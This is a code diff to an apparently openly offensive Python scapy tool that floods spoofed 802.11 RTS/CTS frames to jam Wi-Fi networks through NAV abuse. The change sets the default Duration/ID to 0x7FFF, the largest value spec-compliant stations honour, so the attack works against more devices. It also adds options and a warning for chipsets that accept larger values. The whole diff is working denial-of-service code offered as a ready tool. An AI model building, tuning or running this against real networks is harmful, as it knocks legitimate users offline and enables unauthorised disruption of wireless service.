@@ -2,10 +2,11 @@
 """
 RTS/CTS NAV co-opting DoS.
 
-Floods spoofed RTS or CTS control frames carrying a maximum Duration/ID
-(0xFFFF microseconds). Every station that hears the frame updates its NAV
-(Network Allocation Vector) and defers transmission for that duration.
-Repeated injection holds the medium idle and starves legitimate traffic.
+Floods spoofed RTS or CTS control frames carrying a large Duration/ID
+(default 0x7FFF microseconds, the maximum value the standard treats as a
+NAV). Every station that hears the frame updates its NAV (Network
+Allocation Vector) and defers transmission for that duration. Repeated
+injection holds the medium idle and starves legitimate traffic.
 
 Modes
 -----
@@ -34,7 +35,12 @@ import time
 from scapy.all import Dot11, RadioTap, sendp
 
 
-DURATION_MAX = 0xFFFF  # Maximum Duration/ID value, in microseconds
+# The Duration/ID field only updates a receiver's NAV when bit 15 is 0, so
+# the maximum spec-valid NAV is 0x7FFF (32,767 us). Values with bit 15 set
+# (e.g. 0xFFFF) fall in reserved/fixed-value space and are ignored by
+# spec-compliant stations; allow them via -d for chipsets that honor them.
+NAV_MAX = 0x7FFF       # Default Duration/ID: largest spec-valid NAV, in us
+DURATION_LIMIT = 0xFFFF  # Field is 16 bits wide; cap overrides here
 MAC_RE = re.compile(r"^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$")
 
 
@@ -77,7 +83,7 @@ def flood(iface: str, packets: list, interval: float, count: int) -> int:
             sendp(pkt, iface=iface, inter=interval, count=count, verbose=False)
             return count
         sendp(pkt, iface=iface, inter=interval, loop=1, verbose=False)
-        return 0  # only reached if sendp returns (it doesn't, until Ctrl-C)
+        return 0  # unreachable until Ctrl-C; kept as a fallback return value
 
     sent = 0
     while count == 0 or sent < count:
@@ -104,8 +110,10 @@ def parse_args() -> argparse.Namespace:
     p.add_argument("-i", "--interface", required=True,
                    help="Monitor-mode interface tuned to the target channel")
     p.add_argument("-d", "--duration", type=lambda x: int(x, 0),
-                   default=DURATION_MAX,
-                   help=f"Duration/ID in microseconds (default {DURATION_MAX})")
+                   default=NAV_MAX,
+                   help=f"Duration/ID in microseconds (default {NAV_MAX}, the "
+                        f"largest spec-valid NAV; up to {DURATION_LIMIT} for "
+                        f"chipsets that honor bit-15-set values)")
     p.add_argument("--interval", type=float, default=0.03,
                    help="Inter-frame interval in seconds (default 0.03, ~33/sec)")
     p.add_argument("--count", type=int, default=0,
@@ -116,8 +124,11 @@ def parse_args() -> argparse.Namespace:
 
     if args.mode == "rts" and not args.ap:
         p.error("--ap is required for rts mode")
-    if not 0 <= args.duration <= 0xFFFF:
-        p.error("--duration must fit in 16 bits (0..65535)")
+    if not 0 <= args.duration <= DURATION_LIMIT:
+        p.error(f"--duration must fit in 16 bits (0..{DURATION_LIMIT})")
+    if args.duration > NAV_MAX:
+        print(f"[!] duration {args.duration} has bit 15 set; spec-compliant "
+              f"stations ignore it for NAV (max valid NAV is {NAV_MAX}).")
     return args
 
 
